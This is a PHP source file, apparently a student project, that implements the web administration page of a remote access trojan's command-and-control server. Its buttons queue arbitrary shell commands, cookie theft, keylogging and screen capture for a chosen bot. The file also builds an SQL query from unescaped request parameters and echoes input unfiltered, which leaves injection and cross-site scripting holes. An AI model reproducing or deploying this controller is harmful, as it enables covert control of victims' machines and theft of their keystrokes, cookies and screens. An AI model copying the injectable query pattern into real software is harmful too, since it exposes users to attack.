<?php
if ((isset($_GET['ip']) && !empty($_GET['ip'])) && (isset($_GET['port']) && !empty($_GET['port']))) {
    $ip =  $_GET['ip'];
    $port =  $_GET['port'];
} else if ((isset($_POST['ip']) && !empty($_POST['ip'])) && (isset($_POST['port']) && !empty($_POST['port']))) {
    $ip =  $_POST['ip'];
    $port =  $_POST['port'];
} else {
    $bot = 'no bot';
}
$fp = fopen('botActive.txt', 'w');
fwrite($fp, $ip);
fwrite($fp, '&');
fwrite($fp, $port);
fclose($fp);
$link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
mysqli_select_db($link, "pbl4_v2");
$sql = "SELECT * FROM botes WHERE ip='$ip' && port='$port'";
$result = mysqli_query($link, $sql);
$row = mysqli_fetch_assoc($result);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Open Bot</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            background-color: #87ceeb;
            padding: 20px;

        }

        button {
            padding: 10px;
        }
    </style>
</head>

<body>
    <div id="command-form">
        <img src="serverIcon.png" alt="" width="180vw">
        <h2>BOT RAT Administration Page</h2>
        <form method="post" action="openBot.php?ip=<?php echo $ip ?>&port=<?php echo $port ?>" id="cmdform">
            RAT BOT IP: <input type="text" name="ip" readonly value="<?php echo $ip ?>" /> <!-- Ấn Button sẽ lấy value của cái này rồi chạy file này từ đầu -> name = "bot"-->
            <br><br>
            RAT BOT PORT: <input type="text" name="port" readonly value="<?php echo $port;
                                                                            mysqli_close($link); ?>" />
            <p>Please enter your command: </p>
            <input type="text" name="cmdstr" size="35%">
            <p><input type="submit" name="buttonCmd" value="Execute Cmd"></p>
            <p><input type="submit" name="buttonCookie" value="Execute Cookie"></p>
            <p><input type="submit" name="buttonKeylogger" value="Execute Keylogger"></p>
            <p><input type="submit" name="buttonCapture" value="Execute Capture"></p>
            <p><a href='index.php'>Back to Main</a></p>
        </form>
    </div>
</body>

</html>
<?php
if (isset($_POST['buttonCmd'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received: ' . $cmdstr . '<br>';
        $query = "UPDATE botes SET command='getcmd' WHERE ip=? AND port=?";
        $stmt = $db->prepare($query);
        $stmt->bind_param('ss', $ip, $port); 
        $stmt->execute();
        $db->close();
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcmd");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonCookie'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received: ' . $cmdstr . '<br>'; 
        $query = "UPDATE botes SET command='getcookie' WHERE ip=? AND port=?";
        $stmt = $db->prepare($query);
        $stmt->bind_param('ss', $ip, $port);
        $stmt->execute();
        $db->close();
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcookie");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonKeylogger'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; 
        echo 'Received: ' . $cmdstr . '<br>';
        $query = "UPDATE botes SET command='getkeylogger' WHERE ip=? AND port=?";
        $stmt = $db->prepare($query);
        $stmt->bind_param('ss', $ip, $port);
        $stmt->execute();
        $db->close();
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getkeylogger");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonCapture'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received: ' . $cmdstr . '<br>';
        $query = "UPDATE botes SET command='getcapture' WHERE ip=? AND port=?";
        $stmt = $db->prepare($query);
        $stmt->bind_param('ss', $ip, $port);
        $stmt->execute();
        $db->close();
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcapture");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
}
?>